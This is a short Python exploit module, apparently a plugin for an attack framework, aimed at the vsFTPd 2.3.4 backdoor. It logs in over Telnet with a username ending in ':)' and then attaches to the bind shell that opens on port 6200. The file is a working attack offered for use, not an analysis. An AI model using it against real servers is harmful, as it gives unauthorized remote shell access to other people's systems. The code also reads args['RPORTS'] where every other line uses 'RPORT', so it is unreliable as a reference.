from telnetlib import Telnet
from sky.tools import shell
import time

ARGS =['RHOST','RPORT']

def exploit(args):
    user = "USER nergal:)"
    password = "PASS pass"
    tn = Telnet(args['RHOST'],args['RPORTS'])
    tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"password.") #if necessary, edit this line
    tn.write(password.encode('ascii') + b"\n")
    time.sleep(5)
    return shell.bind(args['RHOST'], 6200)

def auto_args(args):
    args['RPORT'] = 21
    return args
